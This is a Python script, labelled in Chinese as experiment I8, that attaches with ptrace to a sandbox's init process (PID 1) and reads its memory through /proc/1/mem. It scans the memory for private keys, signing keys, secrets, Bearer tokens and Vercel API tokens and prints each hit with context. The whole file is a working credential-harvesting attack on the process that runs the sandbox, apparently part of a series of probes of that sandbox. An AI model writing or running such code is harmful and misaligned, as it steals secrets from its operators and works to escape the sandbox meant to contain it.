# 实验I8: sandbox-init 内存分析(找签名私钥/凭据)
import ctypes, re, os

libc = ctypes.CDLL("libc.so.6")
# PTRACE_ATTACH
if libc.ptrace(16, 1, 0, 0) != 0:
    print("ATTACH FAILED")
    exit(1)
print("attached")

maps = []
with open("/proc/1/maps") as f:
    for line in f:
        parts = line.split()
        addr_range, perms = parts[0], parts[1]
        start, end = [int(x, 16) for x in addr_range.split("-")]
        maps.append((start, end, perms, parts[-1] if len(parts) > 5 else ""))

print(f"== {len(maps)} 个内存区域 ==")
# 打印可读区域摘要
total_readable = 0
for start, end, perms, path in maps:
    if "r" in perms:
        total_readable += end - start
print(f"可读区域总大小: {total_readable/1024/1024:.1f} MB")

# 搜索目标区域: [heap] + 匿名映射 + rw 区域(可能有密钥)
targets = []
for start, end, perms, path in maps:
    if "r" not in perms:
        continue
    if path == "[heap]" or (path.startswith("[") and path != "[vsyscall]"):
        targets.append((start, end, perms, path))
    elif not path.startswith("/") and "r" in perms and "w" in perms:
        targets.append((start, end, perms, path))

print(f"== 目标区域 {len(targets)} 个 ==")
for t in targets:
    print(f"  {t[3] or 'anon'}: {t[0]:#x}-{t[1]:#x} ({ (t[1]-t[0])/1024:.0f}KB) {t[2]}")

# 关键词搜索(限制大小, 每区最多读 32MB)
PATTERNS = [b"PRIVATE KEY", b"BEGIN", b"ed25519", b"signature", b"secret", b"token",
            b"vcp_", b"api.vercel", b"Authorization", b"Bearer "]
hits = []
for start, end, perms, path in targets:
    size = end - start
    if size > 64 * 1024 * 1024:
        continue
    try:
        with open("/proc/1/mem", "rb") as m:
            m.seek(start)
            data = m.read(size)
        for pat in PATTERNS:
            for mch in re.finditer(re.escape(pat), data, re.I):
                pos = mch.start()
                ctx = data[max(0, pos-40):pos+80]
                hits.append((path or "anon", start, pat, ctx))
                if len(hits) > 40:
                    break
            if len(hits) > 40:
                break
    except Exception as e:
        pass
    if len(hits) > 40:
        break

print(f"\n== 命中 {len(hits)} 处 ==")
for h in hits[:40]:
    print(f"  [{h[0]}] @{h[1]:#x} pat={h[2].decode(errors='replace')}: {h[3][:100]!r}")

libc.ptrace(17, 1, 0, 0)  # DETACH
print("detached")
